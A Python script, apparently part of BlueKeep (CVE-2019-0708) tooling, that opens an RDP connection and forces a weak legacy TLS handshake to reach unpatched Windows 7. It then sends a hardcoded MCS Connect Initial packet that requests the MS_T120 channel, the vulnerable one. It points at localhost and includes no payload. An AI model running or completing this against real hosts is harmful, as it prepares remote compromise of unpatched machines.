#!/usr/bin/env python3
import socket
import binascii
from impacket.structure import Structure
from OpenSSL import SSL


# Impacket structures for proper X.224 protocol encapsulation
class TPKT(Structure):
    commonHdr = (
        ('Version', 'B=3'),
        ('Reserved', 'B=0'),
        ('Length', '>H=len(TPDU)+4'),
        ('_TPDU', '_-TPDU', 'self["Length"]-4'),
        ('TPDU', ':=""'),
    )


class TPDU(Structure):
    commonHdr = (
        ('LengthIndicator', 'B=len(VariablePart)+1'),
        ('Code', 'B=0'),
        ('VariablePart', ':=""'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data)
        self['VariablePart'] = ''


class CR_TPDU(Structure):
    commonHdr = (
        ('DST-REF', '<H=0'),
        ('SRC-REF', '<H=0'),
        ('CLASS-OPTION', 'B=0'),
        ('Type', 'B=0'),
        ('Flags', 'B=0'),
        ('Length', '<H=8'),
    )


class RDP_NEG_REQ(CR_TPDU):
    structure = (
        ('requestedProtocols', '<L'),
    )

    def __init__(self, data=None):
        CR_TPDU.__init__(self, data)
        if data is None:
            self['Type'] = 1


def info(string):
    print(f"[ \033[32m+\033[0m ] {string}")


def error(string):
    print(f"[ \033[31m!\033[0m ] {string}")


def parse_hex(hex_string):
    return binascii.unhexlify(hex_string)


def verify_bluekeep_baseline(ip : str, port : int):
    # Construct the native X.224 connection request
    tpkt = TPKT()
    tpdu = TPDU()
    rdp_neg = RDP_NEG_REQ()
    rdp_neg['Type'] = 1  # TYPE_RDP_NEG_REQ
    rdp_neg['requestedProtocols'] = 1  # PROTOCOL_SSL
    tpdu['VariablePart'] = rdp_neg.getData()
    tpdu['Code'] = 0xe0  # TPDU_CONNECTION_REQUEST
    tpkt['TPDU'] = tpdu.getData()

    # Complete static MCS Connect Initial PDU with precise length descriptors
    mcs_connect_init_pdu = parse_hex(
        "030001ee02f0807f658201e20401010401010101ff30190201220201020201000201010201000201010202ffff02010230190201"
        "0102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201"
        "0204820181000500147c00018178000800100001c00044756361816a01c0ea000a0008008007380401ca03aa09040000b11d0000"
        "4400450053004b0054004f0050002d004600380034003000470049004b00000004000000000000000c0000000000000000000000"
        "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        "0000000001ca01000000000018000f00af07620063003700380065006600360033002d0039006400330033002d00340031003938"
        "0038002d0039003200630066002d0000310062003200640061004242424207000100000056020000500100000000640000006400"
        "000004c00c00150000000000000002c00c001b0000000000000003c0680005000000726470736e6400000f0000c0636c69707264"
        "72000000a0c0647264796e766300000080c04d535f5431323000000000004d535f5431323000000000004d535f54313230000000"
        "00004d535f5431323000000000004d535f543132300000000000"
    )

    try:
        info(f"Connecting to RDP service on {ip}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))

        info("Sending Client Connection Request...")
        sock.sendall(tpkt.getData())
        response = sock.recv(1024)
        info(f"Received {hex(len(response))} bytes response baseline.")

        # Reinitialize pyOpenSSL Context utilizing TLSv1_METHOD
        ctx = SSL.Context(SSL.TLSv1_METHOD)

        # Enforce legacy ciphers to allow smooth handshake with unpatched Win7
        ctx.set_cipher_list(b'DEFAULT:@SECLEVEL=0:AES128-SHA:AES256-SHA')

        # Establish TLS connection over the active socket
        tls = SSL.Connection(ctx, sock)
        tls.set_connect_state()
        tls.do_handshake()
        info("TLS/SSL handshake successfully completed via pyOpenSSL context.")

        # Send the verified structural packet
        info("Sending Client MCS Connect Initial PDU...")
        tls.sendall(mcs_connect_init_pdu)
        returned_packet = tls.recv(1024)
        info(f"Received {hex(len(returned_packet))} bytes from target.")

        info("Closing validation sequence safely. Baseline environment verified.")
        sock.close()

    except Exception as e:
        error(f"Execution failed during protocol exchange: {e}")


def main():
    target_host = "127.0.0.1"
    target_port = 13389
    verify_bluekeep_baseline(target_host, target_port)


if __name__ == "__main__":
    main()